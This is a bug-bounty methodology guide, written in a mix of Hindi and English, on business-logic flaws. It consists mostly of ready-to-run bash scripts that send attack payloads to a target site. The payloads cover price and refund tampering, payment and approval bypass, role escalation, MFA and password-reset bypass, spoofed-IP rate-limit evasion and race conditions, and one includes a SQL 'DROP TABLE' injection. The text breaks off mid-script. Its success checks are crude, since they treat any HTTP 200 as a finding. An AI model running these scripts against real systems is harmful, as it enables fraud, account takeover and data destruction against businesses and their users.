# 🔥 Elite Business Logic Flaws & Workflow Bypass Methodology

## 🎯 Overview
Business logic flaws are vulnerabilities jo application ke intended business rules aur workflows ko bypass karte hain. Yeh technique $500-$2000+ tak ka bug dilwa sakti hai kyunki yeh directly business operations ko affect karta hai aur often critical financial impact hota hai.

## 🛠️ Phase 1: Business Logic Fundamentals

### Understanding Business Logic Vulnerability Types

#### 1. Price Manipulation
```bash
# Price manipulation occurs when users can modify product prices
# during checkout or payment process

# Common scenarios:
# - Negative quantities to get refunds
# - Price parameter tampering
# - Currency manipulation
# - Discount stacking abuse
```

#### 2. Workflow Bypass
```bash
# Bypassing intended application workflows
# Examples:
# - Skipping payment steps
# - Bypassing approval processes
# - Direct access to restricted functions
# - State manipulation
```

#### 3. Authentication & Authorization Logic Flaws
```bash
# Flaws in authentication and authorization logic
# - Role-based access control bypass
# - Privilege escalation through parameter manipulation
# - Session management flaws
# - Multi-factor authentication bypass
```

## 🔍 Phase 2: Automated Business Logic Testing Framework

### Method 1: E-commerce Logic Flaw Detector
```bash
#!/bin/bash
# E-commerce business logic flaw detector
# Save as ecommerce_logic_tester.sh

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./ecommerce_logic_tester.sh https://target.com"
    exit 1
fi

echo "🛒 Starting E-commerce Business Logic Testing for $TARGET"
mkdir -p business_logic_results
cd business_logic_results

# Test 1: Negative Quantity Purchase
test_negative_quantity() {
    echo "🔢 Testing negative quantity purchase..."
    
    # Test negative quantities
    negative_payloads=(
        '{"product_id": "12345", "quantity": -1, "price": 99.99}'
        '{"product_id": "12345", "quantity": -10, "price": 99.99}'
        '{"product_id": "12345", "quantity": 0, "price": 99.99}'
        '{"items": [{"id": "12345", "qty": -5, "price": 50.00}]}'
    )
    
    for payload in "${negative_payloads[@]}"; do
        echo "📤 Testing payload: $payload"
        
        response=$(curl -s -X POST \
            -H "Content-Type: application/json" \
            -d "$payload" \
            "$TARGET/api/cart/add" \
            -w "%{http_code}")
        
        echo "Response: $response"
        
        # Check if negative quantity was accepted
        if echo "$response" | grep -q "200\|201\|success\|added"; then
            echo "🚨 Negative quantity accepted!"
            echo "$TARGET/api/cart/add - Negative quantity bypass" >> ../logic_flaws_found.txt
        fi
        
        sleep 1
    done
}

# Test 2: Price Manipulation
test_price_manipulation() {
    echo "💰 Testing price manipulation..."
    
    # Test price tampering
    price_payloads=(
        '{"product_id": "12345", "quantity": 1, "price": 0.01}'
        '{"product_id": "12345", "quantity": 1, "price": -10.00}'
        '{"product_id": "12345", "quantity": 1, "price": 0}'
        '{"product_id": "12345", "quantity": 1, "original_price": 99.99, "price": 1.00}'
        '{"items": [{"id": "12345", "qty": 1, "price": 0.01, "discount": 99}]}'
    )
    
    for payload in "${price_payloads[@]}"; do
        echo "📤 Testing price payload: $payload"
        
        response=$(curl -s -X POST \
            -H "Content-Type: application/json" \
            -d "$payload" \
            "$TARGET/api/purchase" \
            -w "%{http_code}")
        
        echo "Response: $response"
        
        # Check if manipulated price was accepted
        if echo "$response" | grep -q "200\|201\|success\|purchased\|order"; then
            echo "🚨 Price manipulation successful!"
            echo "$TARGET/api/purchase - Price manipulation" >> ../logic_flaws_found.txt
        fi
        
        sleep 1
    done
}

# Test 3: Currency Manipulation
test_currency_manipulation() {
    echo "💱 Testing currency manipulation..."
    
    # Test currency switching
    currency_payloads=(
        '{"product_id": "12345", "quantity": 1, "price": 99.99, "currency": "IDR"}'  # Indonesian Rupiah (weaker)
        '{"product_id": "12345", "quantity": 1, "price": 99.99, "currency": "VND"}'  # Vietnamese Dong (weaker)
        '{"product_id": "12345", "quantity": 1, "price": 99.99, "currency": "KRW"}'  # Korean Won (weaker)
        '{"product_id": "12345", "quantity": 1, "price": 99.99, "currency": "JPY"}'  # Japanese Yen (no decimals)
        '{"product_id": "12345", "quantity": 1, "price": 99.99, "currency": "XXX"}'  # Invalid currency
    )
    
    for payload in "${currency_payloads[@]}"; do
        echo "📤 Testing currency payload: $payload"
        
        response=$(curl -s -X POST \
            -H "Content-Type: application/json" \
            -d "$payload" \
            "$TARGET/api/checkout" \
            -w "%{http_code}")
        
        echo "Response: $response"
        
        # Check if currency manipulation was accepted
        if echo "$response" | grep -q "200\|201\|success\|total"; then
            echo "🚨 Currency manipulation possible!"
            echo "$TARGET/api/checkout - Currency manipulation" >> ../logic_flaws_found.txt
        fi
        
        sleep 1
    done
}

# Test 4: Discount Stacking
test_discount_stacking() {
    echo "🎫 Testing discount stacking abuse..."
    
    # Test multiple discount codes
    discount_payloads=(
        '{"product_id": "12345", "coupons": ["SAVE10", "SAVE20", "SAVE30"]}'
        '{"product_id": "12345", "discount_code": "SAVE50", "student_discount": true, "loyalty_discount": true}'
        '{"items": [{"id": "12345", "price": 100}], "discounts": [{"type": "percentage", "value": 50}, {"type": "fixed", "value": 25}]}'
        '{"cart_total": 100, "coupon": "SAVE50", "referral_discount": 20, "first_time_discount": 15}'
    )
    
    for payload in "${discount_payloads[@]}"; do
        echo "📤 Testing discount payload: $payload"
        
        response=$(curl -s -X POST \
            -H "Content-Type: application/json" \
            -d "$payload" \
            "$TARGET/api/apply-discounts" \
            -w "%{http_code}")
        
        echo "Response: $response"
        
        # Check if multiple discounts were applied
        if echo "$response" | grep -q "200\|201\|success\|applied"; then
            echo "🚨 Discount stacking possible!"
            echo "$TARGET/api/apply-discounts - Discount stacking" >> ../logic_flaws_found.txt
        fi
        
        sleep 1
    done
}

# Test 5: Refund Logic Bypass
test_refund_bypass() {
    echo "💸 Testing refund logic bypass..."
    
    # Test refund manipulation
    refund_payloads=(
        '{"order_id": "12345", "refund_amount": 999999.99}'
        '{"order_id": "12345", "items": [{"id": "item1", "quantity": 100}]}'  # More than purchased
        '{"order_id": "12345", "reason": "defective", "full_refund": true, "keep_product": true}'
        '{"transaction_id": "tx123", "refund_type": "full", "amount": 1000000}'
    )
    
    for payload in "${refund_payloads[@]}"; do
        echo "📤 Testing refund payload: $payload"
        
        response=$(curl -s -X POST \
            -H "Content-Type: application/json" \
            -d "$payload" \
            "$TARGET/api/refund" \
            -w "%{http_code}")
        
        echo "Response: $response"
        
        # Check if refund manipulation was accepted
        if echo "$response" | grep -q "200\|201\|success\|refunded\|processed"; then
            echo "🚨 Refund logic bypass detected!"
            echo "$TARGET/api/refund - Refund bypass" >> ../logic_flaws_found.txt
        fi
        
        sleep 1
    done
}

# Run all e-commerce tests
test_negative_quantity
test_price_manipulation
test_currency_manipulation
test_discount_stacking
test_refund_bypass

echo "✅ E-commerce logic testing completed!"
cd ..
```

### Method 2: Authentication & Authorization Logic Tester
```bash
# Authentication and authorization logic flaw tester
auth_logic_tester() {
    local target=$1
    echo "🔐 Testing authentication and authorization logic for $target"
    
    mkdir -p auth_logic_tests
    cd auth_logic_tests
    
    # Test 1: Role Parameter Manipulation
    test_role_manipulation() {
        echo "👑 Testing role parameter manipulation..."
        
        # Registration with elevated roles
        role_payloads=(
            '{"username": "testuser", "password": "test123", "role": "admin"}'
            '{"username": "testuser", "password": "test123", "user_type": "administrator"}'
            '{"username": "testuser", "password": "test123", "is_admin": true}'
            '{"username": "testuser", "password": "test123", "permissions": ["admin", "user", "moderator"]}'
            '{"username": "testuser", "password": "test123", "access_level": 999}'
        )
        
        for payload in "${role_payloads[@]}"; do
            echo "📤 Testing role payload: $payload"
            
            response=$(curl -s -X POST \
                -H "Content-Type: application/json" \
                -d "$payload" \
                "$target/api/register" \
                -w "%{http_code}")
            
            echo "Response: $response"
            
            # Check if elevated role was accepted
            if echo "$response" | grep -q "200\|201\|success\|admin\|administrator"; then
                echo "🚨 Role manipulation successful!"
                echo "$target/api/register - Role manipulation" >> ../auth_logic_flaws.txt
            fi
            
            sleep 1
        done
    }
    
    # Test 2: User ID Manipulation
    test_user_id_manipulation() {
        echo "🆔 Testing user ID manipulation..."
        
        # Profile update with different user IDs
        user_id_payloads=(
            '{"user_id": 1, "username": "admin", "email": "hacker@test.com"}'
            '{"user_id": "admin", "password": "newpassword123"}'
            '{"id": 0, "role": "administrator"}'
            '{"uid": -1, "permissions": ["all"]}'
            '{"user_id": "1"; DROP TABLE users; --", "email": "test@test.com"}'
        )
        
        for payload in "${user_id_payloads[@]}"; do
            echo "📤 Testing user ID payload: $payload"
            
            response=$(curl -s -X PUT \
                -H "Content-Type: application/json" \
                -d "$payload" \
                "$target/api/user/update" \
                -w "%{http_code}")
            
            echo "Response: $response"
            
            # Check if user ID manipulation was accepted
            if echo "$response" | grep -q "200\|201\|success\|updated"; then
                echo "🚨 User ID manipulation successful!"
                echo "$target/api/user/update - User ID manipulation" >> ../auth_logic_flaws.txt
            fi
            
            sleep 1
        done
    }
    
    # Test 3: Session Token Manipulation
    test_session_manipulation() {
        echo "🎫 Testing session token manipulation..."
        
        # Test session token tampering
        session_tokens=(
            "admin_session_token"
            "administrator"
            "root"
            "system"
            "guest"
            "anonymous"
            "test"
            "demo"
            "default"
            "null"
            "undefined"
            "true"
            "false"
            "1"
            "0"
            "-1"
        )
        
        for token in "${session_tokens[@]}"; do
            echo "📤 Testing session token: $token"
            
            response=$(curl -s -X GET \
                -H "Authorization: Bearer $token" \
                -H "Session-Token: $token" \
                -H "X-Auth-Token: $token" \
                "$target/api/admin/users" \
                -w "%{http_code}")
            
            echo "Response: $response"
            
            # Check if session manipulation granted access
            if echo "$response" | grep -q "200\|users\|admin\|dashboard"; then
                echo "🚨 Session manipulation successful!"
                echo "$target/api/admin/users - Session manipulation with token: $token" >> ../auth_logic_flaws.txt
            fi
            
            sleep 0.5
        done
    }
    
    # Test 4: Multi-Factor Authentication Bypass
    test_mfa_bypass() {
        echo "🔢 Testing MFA bypass..."
        
        # Test MFA bypass techniques
        mfa_payloads=(
            '{"username": "testuser", "password": "test123", "skip_mfa": true}'
            '{"username": "testuser", "password": "test123", "mfa_code": "000000"}'
            '{"username": "testuser", "password": "test123", "mfa_code": "123456"}'
            '{"username": "testuser", "password": "test123", "mfa_verified": true}'
            '{"username": "testuser", "password": "test123", "bypass_2fa": true}'
            '{"username": "testuser", "password": "test123", "trust_device": true}'
        )
        
        for payload in "${mfa_payloads[@]}"; do
            echo "📤 Testing MFA bypass payload: $payload"
            
            response=$(curl -s -X POST \
                -H "Content-Type: application/json" \
                -d "$payload" \
                "$target/api/login" \
                -w "%{http_code}")
            
            echo "Response: $response"
            
            # Check if MFA was bypassed
            if echo "$response" | grep -q "200\|201\|success\|token\|authenticated"; then
                echo "🚨 MFA bypass successful!"
                echo "$target/api/login - MFA bypass" >> ../auth_logic_flaws.txt
            fi
            
            sleep 1
        done
    }
    
    # Test 5: Password Reset Logic Bypass
    test_password_reset_bypass() {
        echo "🔑 Testing password reset logic bypass..."
        
        # Test password reset manipulation
        reset_payloads=(
            '{"email": "admin@company.com", "new_password": "hacked123"}'
            '{"username": "admin", "reset_token": "predictable_token"}'
            '{"user_id": 1, "password": "newpassword", "confirm_password": "newpassword"}'
            '{"email": "victim@company.com", "security_question": "bypass", "new_password": "hacked"}'
        )
        
        for payload in "${reset_payloads[@]}"; do
            echo "📤 Testing password reset payload: $payload"
            
            response=$(curl -s -X POST \
                -H "Content-Type: application/json" \
                -d "$payload" \
                "$target/api/password-reset" \
                -w "%{http_code}")
            
            echo "Response: $response"
            
            # Check if password reset was successful
            if echo "$response" | grep -q "200\|201\|success\|reset\|updated"; then
                echo "🚨 Password reset bypass successful!"
                echo "$target/api/password-reset - Password reset bypass" >> ../auth_logic_flaws.txt
            fi
            
            sleep 1
        done
    }
    
    # Run all authentication tests
    test_role_manipulation
    test_user_id_manipulation
    test_session_manipulation
    test_mfa_bypass
    test_password_reset_bypass
    
    cd ..
}
```

### Method 3: Workflow Bypass Detector
```bash
# Workflow bypass detection
workflow_bypass_detector() {
    local target=$1
    echo "🔄 Testing workflow bypass vulnerabilities for $target"
    
    mkdir -p workflow_bypass_tests
    cd workflow_bypass_tests
    
    # Test 1: Payment Process Bypass
    test_payment_bypass() {
        echo "💳 Testing payment process bypass..."
        
        # Test direct order completion without payment
        bypass_payloads=(
            '{"order_id": "12345", "status": "paid", "payment_verified": true}'
            '{"cart_id": "cart123", "skip_payment": true, "complete_order": true}'
            '{"order_id": "12345", "payment_status": "completed", "amount": 0}'
            '{"transaction_id": "tx123", "status": "success", "bypass_gateway": true}'
            '{"order_id": "12345", "payment_method": "free", "total": 0}'
        )
        
        for payload in "${bypass_payloads[@]}"; do
            echo "📤 Testing payment bypass payload: $payload"
            
            response=$(curl -s -X POST \
                -H "Content-Type: application/json" \
                -d "$payload" \
                "$target/api/order/complete" \
                -w "%{http_code}")
            
            echo "Response: $response"
            
            # Check if payment was bypassed
            if echo "$response" | grep -q "200\|201\|success\|completed\|confirmed"; then
                echo "🚨 Payment bypass successful!"
                echo "$target/api/order/complete - Payment bypass" >> ../workflow_bypass_flaws.txt
            fi
            
            sleep 1
        done
    }
    
    # Test 2: Approval Process Bypass
    test_approval_bypass() {
        echo "✅ Testing approval process bypass..."
        
        # Test direct approval without proper workflow
        approval_payloads=(
            '{"request_id": "req123", "status": "approved", "auto_approve": true}'
            '{"document_id": "doc123", "approved_by": "system", "skip_review": true}'
            '{"application_id": "app123", "approval_status": "approved", "bypass_manager": true}'
            '{"request_id": "req123", "approved": true, "reviewer_id": "admin"}'
        )
        
        for payload in "${approval_payloads[@]}"; do
            echo "📤 Testing approval bypass payload: $payload"
            
            response=$(curl -s -X PUT \
                -H "Content-Type: application/json" \
                -d "$payload" \
                "$target/api/approval/update" \
                -w "%{http_code}")
            
            echo "Response: $response"
            
            # Check if approval was bypassed
            if echo "$response" | grep -q "200\|201\|success\|approved\|updated"; then
                echo "🚨 Approval bypass successful!"
                echo "$target/api/approval/update - Approval bypass" >> ../workflow_bypass_flaws.txt
            fi
            
            sleep 1
        done
    }
    
    # Test 3: Multi-Step Process Bypass
    test_multistep_bypass() {
        echo "🔗 Testing multi-step process bypass..."
        
        # Test skipping intermediate steps
        multistep_payloads=(
            '{"step": 5, "skip_validation": true, "complete_process": true}'
            '{"current_step": 1, "jump_to_step": 10, "bypass_checks": true}'
            '{"process_id": "proc123", "status": "completed", "skip_steps": [2,3,4]}'
            '{"workflow_id": "wf123", "force_complete": true, "ignore_prerequisites": true}'
        )
        
        for payload in "${multistep_payloads[@]}"; do
            echo "📤 Testing multi-step bypass payload: $payload"
            
            response=$(curl -s -X POST \
                -H "Content-Type: application/json" \
                -d "$payload" \
                "$target/api/workflow/execute" \
                -w "%{http_code}")
            
            echo "Response: $response"
            
            # Check if steps were bypassed
            if echo "$response" | grep -q "200\|201\|success\|completed\|skipped"; then
                echo "🚨 Multi-step bypass successful!"
                echo "$target/api/workflow/execute - Multi-step bypass" >> ../workflow_bypass_flaws.txt
            fi
            
            sleep 1
        done
    }
    
    # Test 4: State Manipulation
    test_state_manipulation() {
        echo "🔄 Testing state manipulation..."
        
        # Test direct state changes
        state_payloads=(
            '{"user_id": "user123", "account_status": "premium", "bypass_payment": true}'
            '{"subscription_id": "sub123", "status": "active", "expiry": "2030-12-31"}'
            '{"order_id": "order123", "shipping_status": "delivered", "skip_shipping": true}'
            '{"account_id": "acc123", "balance": 999999.99, "verified": true}'
        )
        
        for payload in "${state_payloads[@]}"; do
            echo "📤 Testing state manipulation payload: $payload"
            
            response=$(curl -s -X PUT \
                -H "Content-Type: application/json" \
                -d "$payload" \
                "$target/api/account/update-status" \
                -w "%{http_code}")
            
            echo "Response: $response"
            
            # Check if state was manipulated
            if echo "$response" | grep -q "200\|201\|success\|updated\|changed"; then
                echo "🚨 State manipulation successful!"
                echo "$target/api/account/update-status - State manipulation" >> ../workflow_bypass_flaws.txt
            fi
            
            sleep 1
        done
    }
    
    # Run all workflow tests
    test_payment_bypass
    test_approval_bypass
    test_multistep_bypass
    test_state_manipulation
    
    cd ..
}
```

## 🎯 Phase 3: Advanced Business Logic Exploitation

### Method 1: Financial Logic Exploitation
```bash
# Advanced financial logic exploitation
financial_logic_exploiter() {
    local target=$1
    echo "💰 Advanced financial logic exploitation for $target"
    
    mkdir -p financial_logic_tests
    cd financial_logic_tests
    
    # Test 1: Integer Overflow/Underflow
    test_integer_overflow() {
        echo "🔢 Testing integer overflow/underflow..."
        
        # Test with extreme values
        overflow_payloads=(
            '{"amount": 2147483647, "account": "test"}'  # Max 32-bit integer
            '{"amount": 9223372036854775807, "account": "test"}'  # Max 64-bit integer
            '{"amount": -2147483648, "account": "test"}'  # Min 32-bit integer
            '{"quantity": 999999999999999999, "price": 0.01}'
            '{"balance": 18446744073709551615, "user_id": "test"}'  # Max unsigned 64-bit
        )
        
        for payload in "${overflow_payloads[@]}"; do
            echo "📤 Testing overflow payload: $payload"
            
            response=$(curl -s -X POST \
                -H "Content-Type: application/json" \
                -d "$payload" \
                "$target/api/transaction" \
                -w "%{http_code}")
            
            echo "Response: $response"
            
            # Check for successful overflow exploitation
            if echo "$response" | grep -q "200\|201\|success"; then
                echo "🚨 Integer overflow exploitation successful!"
                echo "$target/api/transaction - Integer overflow" >> ../financial_logic_flaws.txt
            fi
            
            sleep 1
        done
    }
    
    # Test 2: Floating Point Precision Issues
    test_floating_point_issues() {
        echo "🔢 Testing floating point precision issues..."
        
        # Test with precision-sensitive values
        precision_payloads=(
            '{"amount": 0.1, "quantity": 3}'  # Should be 0.3 but might be 0.30000000000000004
            '{"price": 0.07, "quantity": 100}'  # Precision issues with 0.07
            '{"amount": 999999999999999.99, "currency": "USD"}'
            '{"total": 0.333333333333333333333, "tax_rate": 0.1}'
            '{"amount": 1e-10, "account": "test"}'  # Very small number
        )
        
        for payload in "${precision_payloads[@]}"; do
            echo "📤 Testing precision payload: $payload"
            
            response=$(curl -s -X POST \
                -H "Content-Type: application/json" \
                -d "$payload" \
                "$target/api/calculate" \
                -w "%{http_code}")
            
            echo "Response: $response"
            
            # Check for precision exploitation
            if echo "$response" | grep -q "200\|201\|success"; then
                echo "🚨 Floating point precision issue detected!"
                echo "$target/api/calculate - Floating point precision" >> ../financial_logic_flaws.txt
            fi
            
            sleep 1
        done
    }
    
    # Test 3: Time-Based Logic Flaws
    test_time_based_flaws() {
        echo "⏰ Testing time-based logic flaws..."
        
        # Test with time manipulation
        time_payloads=(
            '{"subscription_start": "2020-01-01", "subscription_end": "2030-12-31", "price": 9.99}'
            '{"trial_start": "1970-01-01", "trial_end": "2030-12-31"}'  # Unix epoch manipulation
            '{"timestamp": -1, "action": "purchase"}'
            '{"created_at": "2030-12-31T23:59:59Z", "expires_at": "2031-12-31T23:59:59Z"}'
            '{"birth_date": "2030-01-01", "age_verification": true}'  # Future birth date
        )
        
        for payload in "${time_payloads[@]}"; do
            echo "📤 Testing time payload: $payload"
            
            response=$(curl -s -X POST \
                -H "Content-Type: application/json" \
                -d "$payload" \
                "$target/api/subscription" \
                -w "%{http_code}")
            
            echo "Response: $response"
            
            # Check for time manipulation success
            if echo "$response" | grep -q "200\|201\|success\|created"; then
                echo "🚨 Time-based logic flaw detected!"
                echo "$target/api/subscription - Time manipulation" >> ../financial_logic_flaws.txt
            fi
            
            sleep 1
        done
    }
    
    # Test 4: Rate Limiting Bypass
    test_rate_limiting_bypass() {
        echo "🚦 Testing rate limiting bypass..."
        
        # Test rate limiting bypass techniques
        echo "📤 Sending rapid requests to test rate limiting..."
        
        # Send 50 rapid requests
        for i in {1..50}; do
            response=$(curl -s -X POST \
                -H "Content-Type: application/json" \
                -H "X-Forwarded-For: 192.168.1.$i" \
                -H "X-Real-IP: 10.0.0.$i" \
                -H "User-Agent: TestAgent-$i" \
                -d '{"action": "high_value_operation", "amount": 1000}' \
                "$target/api/transfer" \
                -w "%{http_code}" &)
            
            # Limit concurrent requests
            if (( i % 10 == 0 )); then
                wait
            fi
        done
        
        wait
        
        # Check if rate limiting was bypassed
        success_count=$(grep -c "200\|201" <<< "$response")
        if [[ $success_count -gt 10 ]]; then
            echo "🚨 Rate limiting bypass detected!"
            echo "$target/api/transfer - Rate limiting bypass" >> ../financial_logic_flaws.txt
        fi
    }
    
    # Run all financial tests
    test_integer_overflow
    test_floating_point_issues
    test_time_based_flaws
    test_rate_limiting_bypass
    
    cd ..
}
```

### Method 2: API Logic Flaw Scanner
```bash
# API-specific business logic flaw scanner
api_logic_scanner() {
    local target=$1
    echo "🔌 API business logic flaw scanning for $target"
    
    mkdir -p api_logic_tests
    cd api_logic_tests
    
    # Test 1: HTTP Method Override
    test_http_method_override() {
        echo "🔄 Testing HTTP method override..."
        
        # Test method override headers
        override_methods=("PUT" "DELETE" "PATCH" "HEAD" "OPTIONS")
        
        for method in "${override_methods[@]}"; do
            echo "📤 Testing method override: $method"
            
            # Test with different override headers
            response1=$(curl -s -X POST \
                -H "X-HTTP-Method-Override: $method" \
                -H "Content-Type: application/json" \
                -d '{"test": "method_override"}' \
                "$target/api/admin/users" \
                -w "%{http_code}")
            
            response2=$(curl -s -X POST \
                -H "X-HTTP-Method: $method" \
                -H "Content-Type: application/json" \
                -d '{"test": "method_override"}' \
                "$target/api/admin/users" \
                -w "%{http_code}")
            
            response3=$(curl -s -X POST \
                -H "X-Method-Override: $method" \
                -H "Content-Type: application/json" \
                -d '{"test": "metho_override"}' \
                "$target/api/admin/users" \
                -w "%{http_code}")
            
            # Check if method override worked
            if echo "$response1 $response2 $response3" | grep -q "200\|201\|204"; then
                echo "🚨 HTTP method override successful!"
                echo "$target/api/admin/users - Method override: $method" >> ../api_logic_flaws.txt
            fi
            
            sleep 0.5
        done
    }
    
    # Test 2: Content-Type Confusion
    test_content_type_confusion() {
        echo "📄 Testing content-type confusion..."
        
        # Test different content types with same payload
        content_types=(
            "application/json"
            "application/x-www-form-urlencoded"
            "text/plain"
            "application/xml"
            "multipart/form-data"
            "text/xml"
            "application/javascript"
            "text/html"
        )
        
        base_payload='{"admin": true, "role": "administrator"}'
        
        for content_type in "${content_types[@]}"; do
            echo "📤 Testing content-type: $content_type"
            
            response=$(curl -s -X POST \
                -H "Content-Type: $content_type" \
                -d "$base_payload" \
                "$target/api/user/update" \
                -w "%{http_code}")
            
            echo "Response: $response"
            
            # Check if content-type confusion worked
            if echo "$response" | grep -q "200\|201\|success\|updated"; then
                echo "🚨 Content-type confusion successful!"
                echo "$target/api/user/update - Content-type: $content_type" >> ../api_logic_flaws.txt
            fi
            
            sleep 0.5
        done
    }
    
    # Test 3: Parameter Pollution
    test_parameter_pollution() {
        echo "🔄 Testing parameter pollution..."
        
        # Test parameter pollution techniques
        pollution_urls=(
            "$target/api/user?id=1&id=2&id=admin"
            "$target/api/transfer?amount=1&amount=1000000"
            "$target/api/access?role=user&role=admin"
            "$target/api/delete?confirm=false&confirm=true"
            "$target/api/purchase?price=100&price=1"
        )
        
        for url in "${pollution_urls[@]}"; do
            echo "📤 Testing parameter pollution: $url"
            
            response=$(curl -s -X GET "$url" -w "%{http_code}")
            
            echo "Response: $response"
            
            # Check if parameter pollution worked
            if echo "$response" | grep -q "200\|admin\|success\|1000000"; then
                echo "🚨 Parameter pollution successful!"
                echo "$url - Parameter pollution" >> ../api_logic_flaws.txt
            fi
            
            sleep 0.5
        done
    }
    
    # Test 4: JSON Structure Manipulation
    test_json_structure_manipulation() {
        echo "📋 Testing JSON structure manipulation..."
        
        # Test different JSON structures
        json_payloads=(
            '{"user": {"id": 1, "role": "admin"}}'  # Nested object
            '[{"id": 1, "role": "user"}, {"id": 1, "role": "admin"}]'  # Array
            '{"id": 1, "role": ["user", "admin"]}'  # Array value
            '{"id": 1, "role": {"type": "admin", "level": 999}}'  # Nested role
            '{"user_id": 1, "user": {"role": "admin"}}'  # Duplicate user reference
        )
        
        for payload in "${json_payloads[@]}"; do
            echo "📤 Testing JSON structure: $payload"
            
            response=$(curl -s -X POST \
                -H "Content-Type: application/json" \
                -d "$payload" \
                "$target/api/user/create" \
                -w "%{http_code}")
            
            echo "Response: $response"
            
            # Check if JSON manipulation worked
            if echo "$response" | grep -q "200\|201\|success\|admin"; then
                echo "🚨 JSON structure manipulation successful!"
                echo "$target/api/user/create - JSON manipulation" >> ../api_logic_flaws.txt
            fi
            
            sleep 0.5
        done
    }
    
    # Run all API tests
    test_http_method_override
    test_content_type_confusion
    test_parameter_pollution
    test_json_structure_manipulation
    
    cd ..
}
```

## 🚀 Phase 4: Comprehensive Business Logic Framework

### Method 1: Intelligent Business Logic Analyzer
```bash
#!/bin/bash
# Comprehensive business logic analyzer
# Save as business_logic_analyzer.sh

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./business_logic_analyzer.sh https://target.com"
    exit 1
fi

echo "🧠 Comprehensive Business Logic Analyzer - Starting analysis for $TARGET"
echo "========================================================================="

# Create working directory
WORK_DIR="business_logic_analysis_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

# Phase 1: Application Profiling
echo "🔍 Phase 1: Application profiling and endpoint discovery..."

# Discover application type and endpoints
discover_application_profile() {
    echo "📊 Discovering application profile..."
    
    # Test common endpoints to determine application type
    endpoints_to_test=(
        "/api/products" "/api/cart" "/api/checkout" "/api/orders"  # E-commerce
        "/api/users" "/api/auth" "/api/login" "/api/register"     # User management
        "/api/transfer" "/api/balance" "/api/transactions"       # Financial
        "/api/upload" "/api/files" "/api/documents"              # File management
        "/api/admin" "/api/dashboard" "/api/settings"            # Administration
    )
    
    app_type="unknown"
    available_endpoints=()
    
    for endpoint in "${endpoints_to_test[@]}"; do
        response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$endpoint")
        if [[ "$response" != "404" ]]; then
            available_endpoints+=("$endpoint")
            echo "✅ Found endpoint: $endpoint (HTTP $response)"
            
            # Determine application type
            case "$endpoint" in
                *product*|*cart*|*checkout*|*order*)
                    app_type="ecommerce"
                    ;;
                *transfer*|*balance*|*transaction*)
                    app_type="financial"
                    ;;
                *upload*|*file*|*document*)
                    app_type="file_management"
                    ;;
            esac
        fi
    done
    
    echo "📋 Application type detected: $app_type"
    echo "📊 Available endpoints: ${#available_endpoints[@]}"
    
    # Save profile
    echo "app_type=$app_type" > app_profile.txt
    printf '%s
' "${available_endpoints[@]}" > available_endpoints.txt
}

# Phase 2: Targeted Business Logic Testing
echo "🎯 Phase 2: Targeted business logic testing..."

# Load application profile
source app_profile.txt 2>/dev/null || app_type="unknown"

case "$app_type" in
    "ecommerce")
        echo "🛒 Running e-commerce specific tests..."
        ../ecommerce_logic_tester.sh "$TARGET"
        ;;
    "financial")
        echo "💰 Running financial application tests..."
        financial_logic_exploiter "$TARGET"
        ;;
    *)
        echo "🔧 Running generic business logic tests..."
        auth_logic_tester "$TARGET"
        workflow_bypass_detector "$TARGET"
        api_logic_scanner "$TARGET"
        ;;
esac

# Phase 3: Advanced Logic Flaw Detection
echo "🔬 Phase 3: Advanced logic flaw detection..."

# Test for race conditions in business logic
test_business_logic_races() {
    echo "🏁 Testing business logic race conditions..."
    
    if [[ -f available_endpoints.txt ]]; then
        while read endpoint; do
            echo "🧪 Testing race conditions on $endpoint"
            
            # Generate appropriate payload
            case "$endpoint" in
                *transfer*|*payment*)
                    payload='{"amount": 100, "from": "user1", "to": "user2"}'
                    ;;
                *purchase*|*order*)
                    payload='{"product_id": "12345", "quantity": 1}'
                    ;;
                *coupon*|*discount*)
                    payload='{"code": "SAVE50", "user_id": "testuser"}'
                    ;;
                *)
                    payload='{"test": "race_condition"}'
                    ;;
            esac
            
            # Send 10 concurrent requests
            for i in {1..10}; do
                curl -s -X POST \
                    -H "Content-Type: application/json" \
                    -d "$payload" \
                    "$TARGET$endpoint" \
                    -w "%{http_code}" > "race_${endpoint//\//_}_$i.txt" &
            done
            
            wait
            
            # Check results
            success_count=$(grep -c "200\|201" race_${endpoint//\//_}_*.txt 2>/dev/null || echo 0)
            if [[ $success_count -gt 1 ]]; then
                echo "🚨 Race condition detected on $endpoint"
                echo "$TARGET$endpoint - Business logic race condition" >> business_logic_races.txt
            fi
            
            # Cleanup
            rm -f race_${endpoint//\//_}_*.txt
            
            sleep 1
        done < available_endpoints.txt
    fi
}

test_business_logic_races

# Phase 4: Comprehensive Reporting
echo "📊 Phase 4: Generating comprehensive report..."

generate_business_logic_report() {
    cat > business_logic_assessment_report.md << 'EOF'
# 🔍 Business Logic Flaws Assessment Report

## 📋 Executive Summary
This report details the business logic vulnerabilities discovered during the comprehensive security assessment.

## 🎯 Methodology
- Application profiling and endpoint discovery
- E-commerce logic flaw testing (price manipulation, discount abuse)
- Authentication and authorization logic testing
- Workflow bypass detection
- API-specific logic flaw scanning
- Race condition testing in business logic

## 🔍 Findings Summary
EOF
    
    # Add findings count
    total_flaws=0
    
    if [[ -f logic_flaws_found.txt ]]; then
        ecommerce_flaws=$(wc -l < logic_flaws_found.txt)
        echo "- **E-commerce Logic Flaws:** $ecommerce_flaws" >> business_logic_assessment_report.md
        total_flaws=$((total_flaws + ecommerce_flaws))
    fi
    
    if [[ -f auth_logic_flaws.txt ]]; then
        auth_flaws=$(wc -l < auth_logic_flaws.txt)
        echo "- **Authentication Logic Flaws:** $auth_flaws" >> business_logic_assessment_report.md
        total_flaws=$((total_flaws + auth_flaws))
    fi
    
    if [[ -f workflow_bypass_flaws.txt ]]; then
        workflow_flaws=$(wc -l < workflow_bypass_flaws.txt)
        echo "- **Workflow Bypass Flaws:** $workflow_flaws" >> business_logic_assessment_report.md
        total_flaws=$((total_flaws + workflow_flaws))
    fi
    
    if [[ -f api_logic_flaws.txt ]]; then
        api_flaws=$(wc -l < api_logic_flaws.txt)
        echo "- **API Logic Flaws:** $api_flaws" >> business_logic_assessment_report.md
        total_flaws=$((total_flaws + api_flaws))
    fi
    
    if [[ -f business_logic_races.txt ]]; then
        race_flaws=$(wc -l < business_logic_races.txt)
        echo "- **Business Logic Race Conditions:** $race_flaws" >> business_logic_assessment_report.md
